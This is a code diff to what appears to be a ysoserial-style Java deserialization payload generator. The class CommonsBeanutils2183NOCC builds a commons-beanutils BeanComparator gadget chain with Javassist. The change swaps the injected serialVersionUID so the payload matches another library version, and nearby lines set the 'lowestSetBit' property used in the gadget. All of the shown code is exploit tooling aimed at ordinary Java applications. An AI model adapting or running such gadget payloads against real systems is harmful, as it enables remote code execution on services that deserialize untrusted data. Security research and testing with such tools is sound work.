@@ -28,7 +28,8 @@ public class CommonsBeanutils2183NOCC implements ObjectPayload<Object> {
 		POOL.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
 		final CtClass ctBeanComparator = POOL.get("org.apache.commons.beanutils.BeanComparator");
 
-		insertField(ctBeanComparator, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");
+//		insertField(ctBeanComparator, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");
+		insertField(ctBeanComparator, "serialVersionUID", "private static final long serialVersionUID = -2044202215314119608L;");
 
 		final Comparator comparator = (Comparator) ctBeanComparator.toClass(new SuClassLoader()).newInstance();
 		setFieldValue(comparator, "property", "lowestSetBit");
